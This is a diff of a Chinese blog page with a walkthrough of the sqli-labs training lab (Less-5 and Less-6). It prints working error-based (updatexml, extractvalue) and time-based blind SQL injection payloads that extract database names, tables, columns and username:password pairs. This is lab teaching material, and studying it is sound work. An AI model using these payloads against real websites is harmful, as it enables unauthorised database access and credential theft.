 <p>XPath语法介绍:<a target="_blank" rel="noopener" href="https://blog.csdn.net/dearbaba_8520/article/details/81557827">https://blog.csdn.net/dearbaba_8520/article/details/81557827</a></p>
 <p>常用注入语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(1,payload),1)。</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">updatexml(1,concat(1,payload),1)。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>concat()函数用于将多个字符串连接成一个字符串,目的是让拼接后的字符串不符合XPath格式使其报错,显示出要查的对象。</strong></p>
 <p><strong>最终的目的是使其报错，至于拼接的值多种多样，并不局限于1。</strong></p>
 <p>如图：</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203205634875.png" alt="image-20220203205634875"></p>
 <h2 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h2><p>注入语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这里的<code>0x7eASCII是~</code>,<code>updatexml()</code>报错信息为特殊字符，字母及之后的内容，为了前面字母丢失，开头连接一个特殊字符~。（并不局限于0x7e）</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203210618677.png" alt="image-20220203210618677"></p>
 <h2 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h2><p>爆版本号：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(select version()),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select version()),0x7e),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203211223581.png" alt="image-20220203211223581"></p>
 <p>爆数据库：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>爆表名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),0x7e),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>爆列名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),0x7e),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203212659594.png" alt="image-20220203212659594"></p>
 <p>爆列名的时候用group_concat()函数没有爆出关键字段，这里需要控制<strong>limit 0,1</strong>爆出关键字段。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 4,1),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),0x7e),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>爆出用户名：</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203212908733.png" alt="image-20220203212908733"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 5,1),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 5,1),0x7e),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>爆出密码：</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203212946551.png" alt="image-20220203212946551"></p>
 <p>爆内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(select concat(username,&#x27;:&#x27;,password) from users limit 0,1),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>这里同样需要控制limit字段爆出信息</strong></p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203213330601.png" alt="image-20220203213330601"></p>
@@ -714,46 +718,47 @@
 <p>　　第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
 <p>　　第二个参数：XPath_string (Xpath格式的字符串)</p>
 <p><strong>payloaod:</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(0x7e,concat(0x7e,(select @version()),0x7e));</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">and extractvalue(0x7e,concat(0x7e,(select @version()),0x7e));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>extractvalue注入的原理：依旧如同<code>updatexml</code>一样，extract的第二个参数要求是<strong>xpath格式字符</strong>串，而我们<strong>输入的并不是</strong>。所以报错</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203214242168.png" alt="image-20220203214242168"></p>
 <p>后续过程如updatexml()相同。</p>
 <hr>
 <h2 id="0x01（时间盲注）"><a href="#0x01（时间盲注）" class="headerlink" title="0x01（时间盲注）"></a>0x01（时间盲注）</h2><p><strong>对于时间盲注，根据浏览器的反应，来猜测出数据库名，其实时间注入就是比布尔盲注多了一个<code>if函数</code>，<code>sleep()</code>函数就相当于布尔盲注中的<code>true或false</code>，其他语句大致都相同。</strong></p>
-<h3 id="sleep-函数"><a href="#sleep-函数" class="headerlink" title="sleep()函数"></a>sleep()函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and if(length(database())&gt;9,1,sleep(10)) --+</span><br></pre></td></tr></table></figure>
+<h3 id="sleep-函数"><a href="#sleep-函数" class="headerlink" title="sleep()函数"></a>sleep()函数</h3><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if(length(database())&gt;9,1,sleep(10)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>if(condition,true,false)/若条件为真 返回true，若条件为假 返回false</strong></p>
 <p>这里执行失败的话将睡10s。</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203215718878.png" alt="image-20220203215718878"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-5/?id=1&#x27; and if(length(database())&gt;6,1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if(length(database())&gt;6,1,sleep(5)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>执行成功则会迅速返回结果。</p>
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203220032518.png" alt="image-20220203220032518"></p>
 <p>爆数据库名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr(database(),1,1)))&gt;120,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&quot; and if((ascii(substr(database(),1,1)))&gt;120,1,sleep(10))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>爆表名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;120,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&quot; and if((ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)))&gt;120,1,sleep(10))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>爆列名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))))&gt;100,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&quot; and if((ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1))))&gt;100,1,sleep(10))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>爆值：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and  if((ascii(substr(( select username from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+  </span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&quot; and  if((ascii(substr(( select username from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and  if((ascii(substr(( select password from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+  </span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&quot; and  if((ascii(substr(( select password from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>还是写个脚本跑一下方便啊！手工注效率低还容易出错啊！</p>
 <hr>
 <h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>第六关根据源码判断出，双引号报错：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = &#x27;&quot;&#x27;.$id.&#x27;&quot;&#x27;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;
+$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203221301023.png" alt="image-20220203221301023"></p>
 <p>这一关的注入方式和第五关相同，只需要将 <code>&#39;</code> 变为 <code>&quot;</code> 即可</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-6/?id=1&quot; union select 1,count(*),concat((select database()),floor(rand()*2)) a from information_schema.schemata  group by a--+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-6&#x2F;?id&#x3D;1&quot; union select 1,count(*),concat((select database()),floor(rand()*2)) a from information_schema.schemata  group by a--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203222058885.png" alt="image-20220203222058885"></p>
 <p>后续过程同Less-5。</p>
@@ -1198,7 +1203,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">31.4k</span>
+                        class="white-color">32.1k</span>
             
             
             
